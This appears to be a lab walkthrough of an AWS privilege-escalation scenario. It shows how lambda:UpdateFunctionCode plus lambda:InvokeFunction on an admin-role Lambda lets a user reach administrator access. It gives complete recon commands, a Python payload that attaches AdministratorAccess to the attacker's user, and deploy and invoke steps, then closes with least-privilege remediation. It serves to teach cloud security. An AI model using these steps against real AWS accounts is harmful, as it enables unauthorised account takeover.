# Guided Walkthrough: Privilege Escalation via lambda:UpdateFunctionCode + lambda:InvokeFunction

This scenario demonstrates a critical privilege escalation vulnerability where an attacker with both `lambda:UpdateFunctionCode` and `lambda:InvokeFunction` permissions can compromise existing Lambda functions to execute arbitrary code under the function's privileged execution role. This is a more powerful variant of the lambda-updatefunctioncode scenario because the attacker can immediately invoke the malicious code without waiting for event triggers.

The vulnerability lies in treating code deployment permissions as less sensitive than IAM policy modifications. In reality, the ability to modify code that executes with elevated privileges, combined with the ability to invoke that code on-demand, is functionally equivalent to having those privileges yourself. If a Lambda function runs with an administrative role, anyone who can update its code and invoke it can execute arbitrary operations with administrative access immediately.

This attack is particularly dangerous because it provides instant, repeatable execution of malicious code with administrative privileges. Unlike scenarios that rely on CloudWatch Events, S3 triggers, or other external events, you have full control over when and how many times the malicious payload executes. This makes it ideal for persistent access, data exfiltration, and privilege escalation operations.

## The Challenge

You start with credentials for `pl-prod-lambda-004-to-admin-starting-user` — an IAM user with a narrow set of Lambda permissions. Your goal is to reach administrative access by exploiting those permissions against `pl-prod-lambda-004-to-admin-target-lambda`, a Lambda function that runs with an administrative execution role.

The starting user has been granted `lambda:UpdateFunctionCode` and `lambda:InvokeFunction` on the target Lambda. That combination is all you need.

## Reconnaissance

Before touching the function, let's confirm your identity and gather information about the target.

Verify you are operating as the starting user:

```bash
aws sts get-caller-identity --query 'Arn' --output text
# arn:aws:iam::{account_id}:user/pl-prod-lambda-004-to-admin-starting-user
```

Confirm you don't yet have admin access — trying to list IAM users should fail:

```bash
aws iam list-users --max-items 1
# AccessDenied
```

Now look at the target Lambda. The most important things to retrieve are the **handler name** (which determines what filename your malicious code must use) and the **execution role ARN** (which confirms the function is worth targeting):

```bash
aws lambda get-function --function-name pl-prod-lambda-004-to-admin-target-lambda
```

Look for `Configuration.Handler` in the output — it will read `lambda_function.lambda_handler`. This tells you the file must be named `lambda_function.py` and the entry point function must be named `lambda_handler`. Get this wrong and your payload won't be called when the function is invoked.

Also note `Configuration.Role` — you'll see it points to `pl-prod-lambda-004-to-admin-target-role`, which has `AdministratorAccess` attached.

## Exploitation

You now have everything you need. The plan is straightforward: write a Python payload that attaches `AdministratorAccess` to your starting user, package it as a zip matching the handler convention, push it to the function, then invoke it.

First, craft the malicious Python file. The filename must match the handler prefix:

```bash
cat > /tmp/lambda_function.py << 'EOF'
import json
import boto3

def lambda_handler(event, context):
    iam = boto3.client('iam')
    target_user = 'pl-prod-lambda-004-to-admin-starting-user'
    policy_arn = 'arn:aws:iam::aws:policy/AdministratorAccess'

    iam.attach_user_policy(
        UserName=target_user,
        PolicyArn=policy_arn
    )

    return {
        'statusCode': 200,
        'body': json.dumps({'success': True, 'message': f'AdministratorAccess attached to {target_user}'})
    }
EOF
```

Package it:

```bash
cd /tmp && zip lambda_function.zip lambda_function.py && cd -
```

Now push it to the function using `lambda:UpdateFunctionCode`:

```bash
aws lambda update-function-code \
  --function-name pl-prod-lambda-004-to-admin-target-lambda \
  --zip-file fileb:///tmp/lambda_function.zip
```

The response will include `"LastUpdateStatus": "Successful"` once the deployment completes. Wait a few seconds for Lambda to finish processing the update, then invoke it immediately with `lambda:InvokeFunction`:

```bash
aws lambda invoke \
  --function-name pl-prod-lambda-004-to-admin-target-lambda \
  --payload '{}' \
  /tmp/response.json

cat /tmp/response.json
```

Your malicious code now executes inside the Lambda runtime, which has assumed the `pl-prod-lambda-004-to-admin-target-role` execution role. That role has `AdministratorAccess`, so the `iam.attach_user_policy` call succeeds and `AdministratorAccess` is attached to your starting user.

## Verification

After IAM policy propagation (allow ~15 seconds), verify that your starting user now has administrative access:

```bash
aws iam list-attached-user-policies \
  --user-name pl-prod-lambda-004-to-admin-starting-user
# Should show AdministratorAccess in the policy list

aws iam list-users --max-items 3
# Should now succeed where it previously returned AccessDenied
```

## What Happened

You exploited the combination of `lambda:UpdateFunctionCode` and `lambda:InvokeFunction` to turn a Lambda function into an execution proxy. Because the function's execution role had `AdministratorAccess`, any code running inside it had the same privileges — and you controlled that code.

In real-world environments, this pattern appears whenever CI/CD engineers or developers are given direct access to update Lambda code as a convenience shortcut, without considering that the function's execution role is significantly more privileged than the developer's own IAM identity. The fix is separation of concerns: code deployment permissions should live in a dedicated pipeline identity, and execution roles should follow least privilege regardless of who can deploy to them.
